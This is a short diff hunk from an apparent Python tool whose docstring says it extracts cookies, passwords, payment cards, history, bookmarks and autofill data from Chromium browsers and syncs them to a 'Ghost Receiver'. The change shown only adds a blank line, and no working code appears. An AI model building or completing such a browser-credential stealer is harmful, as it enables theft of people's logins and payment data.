@@ -6,6 +6,7 @@ Extracts cookies, passwords, cards, history, bookmarks, autofill
 from all Chromium browsers and syncs to Ghost Receiver.
 """
 
+
 import os
 import sys
 import json
